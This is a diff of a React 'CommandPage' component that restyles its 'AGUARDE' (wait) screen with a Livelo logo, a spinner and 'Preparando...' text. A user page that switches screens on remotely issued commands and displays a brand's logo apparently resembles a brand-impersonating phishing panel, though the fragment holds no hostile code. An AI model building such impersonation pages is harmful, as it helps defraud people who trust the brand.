@@ -947,15 +947,29 @@ function CommandPage({ userId }) {
   // Página aguarde
   if (currentCommand?.action === "AGUARDE") {
     return (
-      <div className="min-h-screen bg-white flex items-center justify-center px-4 font-inter">
-        <div className="max-w-md w-full text-center">
-          <div className="mb-6">
-            <div className="inline-block animate-spin rounded-full h-16 w-16 border-b-4 border-pink-500"></div>
+      <div className="min-h-screen bg-white flex flex-col font-inter">
+        <div className="flex-1 flex flex-col items-center justify-center px-4">
+          {/* Logo Livelo */}
+          <div className="mb-12">
+            <img 
+              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
+              alt="Livelo Logo" 
+              className="h-12 w-auto"
+            />
           </div>
-          <h1 className="text-3xl font-bold text-gray-900 mb-4">Aguarde...</h1>
-          <p className="text-gray-600">
-            Estamos processando sua solicitação. Por favor, aguarde um momento.
-          </p>
+
+          {/* Spinner de loading */}
+          <div className="mb-8">
+            <div className="relative">
+              <div className="w-16 h-16 border-4 border-gray-200 rounded-full"></div>
+              <div className="absolute top-0 left-0 w-16 h-16 border-4 border-transparent border-t-pink-500 rounded-full animate-spin"></div>
+            </div>
+          </div>
+
+          {/* Texto Preparando */}
+          <h1 className="text-2xl font-bold text-gray-800">
+            Preparando...
+          </h1>
         </div>
       </div>
     );
